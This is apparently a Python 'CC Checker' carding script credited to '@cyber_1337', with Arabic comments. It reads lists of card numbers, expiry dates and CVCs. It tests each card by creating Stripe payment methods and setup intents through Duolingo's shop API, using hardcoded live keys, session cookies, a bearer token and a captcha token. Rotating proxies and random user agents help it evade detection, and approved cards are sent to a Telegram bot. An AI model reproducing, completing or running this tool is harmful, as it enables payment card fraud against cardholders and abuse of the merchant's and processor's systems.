import requests
import time
import os
from fake_useragent import UserAgent
import re 
import random
import string
import uuid
import json
from colorama import Fore, init
import pyfiglet
from cfonts import render

# تهيئة colorama
init(autoreset=True)

# تهيئة UserAgent
ua = UserAgent()

# تنظيف الشاشة
os.system("clear" if os.name != 'nt' else "cls")


# عرض بانر
def display_banner():
    banner_text = pyfiglet.figlet_format("CC Checker", font="slant")
    print(Fore.CYAN + banner_text)
    print(Fore.YELLOW + "BY @cyber_1337\n")

display_banner()
filename = input('\x1b[1;97m[ \x1b[1;92m?\x1b[1;97m ] Name File : \x1b[1;92m')
try:
    # Open the file with error handling
    with open(filename, 'r') as file:
        lines = file.readlines()
except FileNotFoundError:
    print(f"Error: File '{filename}' not found.")
    exit()
except Exception as e:
    print(f"Error opening file: {e}")
    exit()
tokentele = input(Fore.WHITE + "[ " + Fore.GREEN + "?" + Fore.WHITE + " ] token bot : " + Fore.GREEN)
idte = input(Fore.WHITE + "[ " + Fore.GREEN + "?" + Fore.WHITE + " ] id telegram : " + Fore.GREEN)
print('')

# إضافة دعم البروكسي
# إضافة دعم البروكسي مع تحديد النوع
proxy_filename = input(Fore.WHITE + "[ " + Fore.GREEN + "?" + Fore.WHITE + " ] Proxy file name (leave blank to work without a proxy): " + Fore.GREEN)

proxies_list = []
if proxy_filename.strip():  # إذا أدخل المستخدم اسم ملف
    try:
        with open(proxy_filename, 'r') as f:
            proxies_list = f.read().splitlines()
        print(Fore.GREEN + f"{len(proxies_list)} proxy loaded from {proxy_filename}")
        
        # سؤال عن نوع البروكسي
        proxy_type = input(Fore.WHITE + "[ " + Fore.GREEN + "?" + Fore.WHITE + " ] نوع البروكسي (1 for HTTP, 2 for SOCKS4, 3 for SOCKS5): " + Fore.GREEN)
        if proxy_type == "2":
            proxy_scheme = "socks4"
        elif proxy_type == "3":
            proxy_scheme = "socks5"
        else:
            proxy_scheme = "http"  # افتراضي
            
        print(Fore.GREEN + f"Proxy type specified: {proxy_scheme.upper()}")
        
    except FileNotFoundError:
        print(Fore.RED + f"The file {proxy_filename} does not exist. It will work without a proxy.")
        proxies_list = []
    except Exception as e:
        print(Fore.RED + f"Error reading proxy file: {e}. Will work without a proxy.")
        proxies_list = []
else:
    print(Fore.YELLOW + "سيتم العمل بدون بروكسي")

# دالة لاختيار بروكسي عشوائي
def get_random_proxy():
    if proxies_list and proxy_scheme:
        proxy = random.choice(proxies_list)
        return {
            'http': f'{proxy_scheme}://{proxy}',
            'https': f'{proxy_scheme}://{proxy}'
        }
    return None

# ثم في كل طلب requests، أضف параметر proxies كما يلي:
# response = requests.post(..., proxies=get_random_proxy(), timeout=30)

# ثم في كل طلب requests، أضف параметر proxies كما يلي:
# response = requests.post(..., proxies=get_random_proxy(), timeout=30)
m = Fore.RED
c = Fore.GREEN

start_num = 0
for P in lines:
    start_num += 1
    try:
        n = P.split('|')[0]
        mm = P.split('|')[1]
        yy = P.split('|')[2][-2:]
        cvc = P.split('|')[3].replace('\n', '')
        P = P.replace('\n', '')
    except IndexError:
        print(Fore.RED + f"[ {start_num} ] خطأ في تنسيق البطاقة: {P}")
        continue
    user_agent_1 = ua.random
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user_agent_1,
}

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IQ&payment_user_agent=stripe.js%2Ff47b5e380c%3B+stripe-js-v3%2Ff47b5e380c%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.duolingo.com&time_on_page=70562&client_attribution_metadata[client_session_id]=6f60b155-b4a1-4d19-a0b9-75d6b1b05805&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=fc816109-7702-403c-8bf6-af32f51f797d&guid=6e90c539-a29f-4d07-a032-eb0ee08ea02e&muid=33f1180b-bffb-42a0-ba8f-dbbeae123a64&sid=2eb4a82e-7857-43fb-896b-e3dd29ecb750&key=pk_live_wGV2ziRFq7KJLNaVUAJgrzDf&_stripe_version=2025-03-31.basil&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU3Nzk2MDcyLCJjZGF0YSI6InYzdE0wVUNRRXZXb3ZQTVZ5U3NYOEJ0aVY1U0hIVGc1NWlGNXVqRHVZclN6dnBtTkU3ZllLUElTdFd3L1NPZ2F5ZjZSYW51aVhsdllzR3hUQUphQ2didmtaV1dhRUh2MUFCdUpUT3lBRGVGOFA0TzdJWnFvN0NnYlp2eUMvYXNSOFp3UDVRZDVhVERxS1JES0dkM2JpZ2pSZ2NVbHk2QnFtVkhyUGE4WGh1ZWMxSnB5UHpEQW9HWTFEV1FIV1VZbURKMWh6VmxzZzB6NTZXL3ciLCJwYXNza2V5IjoiWHh3TVMvRzI3UWVkcjJwV0NjSWF0TjYxUDVUR3pTVHRxNU5jWDgwdG1SK0c3R2Q0WGpOSUowbWI3c0RTUCs4dUpYblVRSzdob3YwUE5yWG50VW83UExaYml5cExXYUVJNTc4YldWS0FQUDFVMTBoYVVWSWlNKzlKckt0N2tJV3VmUS8wbWgwdGI0RGQwSndqRDJuQTBuRU1KZW9QQU5XQW10R2JWN2s4RTB0YUZvY2hCY1NTQlVUam9PY1BXL1RZYnRVdlYyZHIzeXNjVEJMNVVDSWZQek8yV0dCTnYwb3dsMDhKZDN4L214TW9OWE0wTXZLRjFSZVB0VEplL2ZzeDRKUEtJdCtPQWlJeXpDNW41TDc1NTRLclBmM3JJZ21tTzYrWVlUWDBYN2NENFdka05xN0YxM0F6NEYyUGRybGlxK0xORnNYc3BkLy9LdlBFSSsyZ2d0WVVDaVE1TERDNW9sbk5Hczd3V3JRTW1iU2MrN2p0Tlgxa1JVa0tMU0Jja1VDQlVUWEVGeXdQU1RVbVNEcHdYc3NiU0lNWVRXOTcwU0wzbHBRTEp0cDhOazJDdVoyZk5hSTFlbG5DSXJOTk50SDI4TkpMMlFDRzRnSFJYWEg2RERUMzVOQ3lNWlZwLzRyMm9rT0YzRHQ0OFB1SC95NGRnaGlCSFRIODZNKzJJVldMRjJXNjV1UWJ1ZDQ2dGNhU1lkcUF1eXJubW5TMmJ3c0VNM2NpQnk0TEZIZHk4VWNkRE02aFhqRTNPQlc1ZXBwaW1aVDNnMlNwc1ZoNkZiY2pkbXZDRVBxWXQ1YVkwK0NBVi9YaGF0bDVIUnJpbDZOZVFEZjRmSHpJc0xIdFcxS3ZaZHZ6SE1wem9yUnU0SUR4MWVxV2xaYkhKZktOS1hPamlUMzBsMUpNOEdkdk1HRnV5ajNKbHZKZFg3RGprOEhVMU5JcTBtWFppUDA5WFY5dWNZM2IzY05ySlU1dFR0ajZycmQwVXVVb09ETUljYkl0VXFQbWR0aFJpdy94YWszazRxQ0hTc3Zic1RZUGRBRUZOamxCcldFL2NmODkzWWpTUDkzTkxPRmNPM21wTi9sNVpjZXkzWGdROHZWTGdPcTNVcEEwSGlMQUU2c1VDMkNULzhDNHFUVXMreGQ1MDJjK2ZTeFQvcUg4VkhpMFFDU2MxbzJ4c2lrbWJjOWJaTWw5NHVBK20ramMzWlNKVklWWk9FOTBoc3cxZ3JHaTNxSmZiVTRFNkZPN2JqWjltM3V6d2l2TXoxRThhQWVkcWU3bW82T0FoQU5hU0E2R09ZTWJaVE1sR09YNFB3MkRGZjJJaHZNY21Sa1V2QkNaa3BHY2RWWkRwa25kR3VVSTYzM2VFVjc2L25wa20vY0dlSE5id3NEbnlJRktXSDBraEs2UmM0TFdJQ0NqOVpEV1czOGNNeGJOS0JBaWprTHJpZ0JlZjY3UjRkYmxob1VlaDhvRzI1bk5WYS9XRytPaldZTVJjZWxJQUhnUlZVSCt5VkFhT3U3Z0pYdVZoSXZPRHN4MXdpdERkOEhNMHZBRjlQT3VKbm9yTkZmbHdXT2tEbmlYRkxxa1lReStsTFkrR0xNM2FkR2txa3ZjRitqK3FMWnYveFpmQXNYYlVwNmtZOEZRMVhwTGt1NVFpRW9aQzZSV05jT2NtVjhKaTgzQWJNZVlIcXdNQU9EeXMySjdUdHRNbzIzSGYwWCs4VkNnM2VacGlNSjdONGJ0K1I4YnBGV3NlWWMzYysyUC9hWmxoQ1BhVmFnc3VMUTAwbmp6UVJaeEFKUUU4U2VVSC83WkVhWjR1N1A0OEkxdmFORzMvcWdBaDBqalUyNEQwQmlXeUxuU21YMS8rZWFlYzJtdkNXNEZidTQvSW9WUVRsajV1T3l2U016TTF2cnYzNjNZRExNWTdPSEc0aXhCajRHaEF3WnZCQ1JMQVdMN1NFZUI1RXV2SFFWajFDSHVuNC82eFB6R09IZ3QxZnFLMFJPSDU0RTB3aEVlNlZMMzdVQ3p1bUptQ0VNdkNrVldPRUpjdkRTOFZYQVFNdGlEckx3d2RvbUFYWEZoVnp0TWtXekVlREZqYldlMk5RbDU2c1lWc3g4ZElRUDIvZEFqYWhqWDZjSkZyMkp5UXczNEp0RDJKYUlUaXlpcDF5RkRMVmFkZ2Jzd2RRN2toWUpkWDQyTUtwZ01oTHFsWG5Ndm1ObWxTcVY4bVZzWnFjdHU2SzJsNXB5YnZxWWdnb01HWCtkK1BGaWUwK08vYlF4eW91UjVyR1ozYTNwK2F5aGYvVi84aWJnd0c1aHB3RTg1SlJ4MCIsImtyIjoiMTVhZjY5ZmQiLCJzaGFyZF9pZCI6MzM5NTEwMzAzfQ.mDzRTokTc99iZesvT-YuhjY0tLqLyuenaR4OGg1yctg'
    try:  
        response = requests.post('https://api.stripe.com/v1/payment_methods',headers=headers,data=data,proxies=get_random_proxy(), timeout=30)
        id = (response.json()['id'])
    except Exception as e:
        print(Fore.RED + f"[ {start_num} ] خطأ في الطلب الأول: {str(e)}\n {n}|{mm}|{yy}|{cvc}")
        continue
    user_agent_2 = ua.random
    cookies = {
    'lang': 'en',
    'lu': 'https://www.duolingo.com/',
    'initial_referrer': '$direct',
    'lr': '',
    'lp': 'splash',
    '_gid': 'GA1.2.1121687928.1757795671',
    '_gcl_au': '1.1.1769939072.1757795671',
    '_fbp': 'fb.1.1757795671034.392419041504478093',
    'csrf_token': 'IjgzYjU4MjgyMDNjYzRiMDVhNjI0ODBhNjc0MDIwYTc0Ig==',
    'logged_out_uuid': '557576933460094',
    'logged_in': 'true',
    'wuuid': 'b274eb50-071f-403f-b3e2-6f9b14168526',
    'jwt_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjo1NTc1NzY5MzM0NjAwOTR9.g7C3O2g06_ATM1STfBfIeOffrTKMgsJOFkONrQJ64ZM',
    'tsl': '1757795915964',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Sat+Sep+13+2025+23%3A38%3A36+GMT%2B0300+(Arabian+Standard+Time)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=0e46347a-29ee-4438-886b-e609cc340270&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false',
    '_ga_CSFDVCPQ4F': 'GS2.1.s1757795670$o1$g1$t1757795918$j13$l0$h0',
    '_ga': 'GA1.2.1196655139.1757795671',
    'AWSALB': 'dWYOm5w1ABJ0wtGin2wkZ18ra/zmCfByvTRsC+eBho5FQ6TFcydUpf6lDtAoFQUtaS0Q4Jnf72Jx05X9h6P0fHFe0L54B92L9a/FiDhWdKxSB5IH+MX0cH/cCp0U',
    'AWSALBCORS': 'dWYOm5w1ABJ0wtGin2wkZ18ra/zmCfByvTRsC+eBho5FQ6TFcydUpf6lDtAoFQUtaS0Q4Jnf72Jx05X9h6P0fHFe0L54B92L9a/FiDhWdKxSB5IH+MX0cH/cCp0U',
    'fs_lua': '1.1757795946851',
    'fs_uid': '#QZHJ3#70b48c01-5f30-4a75-b2cb-7ee5f38bc9af:ca2fa929-5f56-472e-a310-8d14bde1b2f7:1757795946851::1#1e579f38#/1789331949',
    '_gat_UA-21595814-1': '1',
}

    headers = {
    'authority': 'www.duolingo.com',
    'accept': 'application/json; charset=UTF-8',
    'accept-language': 'en-US,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjo1NTc1NzY5MzM0NjAwOTR9.g7C3O2g06_ATM1STfBfIeOffrTKMgsJOFkONrQJ64ZM',
    'content-type': 'application/json; charset=UTF-8',
    'idempotency-key': id,
    'origin': 'https://www.duolingo.com',
    'referer': 'https://www.duolingo.com/shop',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user_agent_2,
    'x-amzn-trace-id': 'User=557576933460094',
    'x-requested-with': 'XMLHttpRequest',
}

    json_data = {
        'paymentMethodId': id,
        'product': 'DUOLINGO',
    }
    try:
        response = requests.post('https://www.duolingo.com/2017-06-30/users/557576933460094/create-setup',cookies=cookies,headers=headers,json=json_data,proxies=get_random_proxy(), timeout=30)
        clientSecret = (response.json()['clientSecret'])
    except Exception as e:
        print(Fore.RED + f"[ {start_num} ] خطأ في الطلب الثاني: {str(e)}\n {n}|{mm}|{yy}|{cvc}")
        continue
    user_agent_3 = ua.random
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user_agent_3,
}

    data = {
        'return_url': 'https://www.duolingo.com/shop',
        'payment_method': id,
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
        'key': 'pk_live_wGV2ziRFq7KJLNaVUAJgrzDf',
        'client_secret': clientSecret,
    }
    ids = clientSecret.split('_secret_')[0]
    try:
        response = requests.post(f'https://api.stripe.com/v1/setup_intents/{ids}/confirm',headers=headers,data=data,proxies=get_random_proxy(), timeout=30)
        ii = (response.text)
    except Exception as e:
        print(Fore.RED + f"[ {start_num} ] خطأ في الطلب الثالث: {str(e)}\n {n}|{mm}|{yy}|{cvc}")
        continue
    if 'succeeded' in ii:
        print(c + f'[ {start_num} ]\x1b[1;92m', P, '\n\x1b[1;92mcondition➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  ✅\nRequired balance➜ 0.99$ \nBY @cyber_1337')
        requests.get(f'https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idte}&text= {P} \ncondition➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  ✅\nRequired balance➜ 0.99$ \nBY @cyber_1377 ')    
    else:
        print(m + f'[ {start_num} ]\033[1;31m', P, '\n\033[1;31mcondition➜ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\nRequired balance➜ 0.99$ \nBY @cyber_1337')
#by @CYBER_1337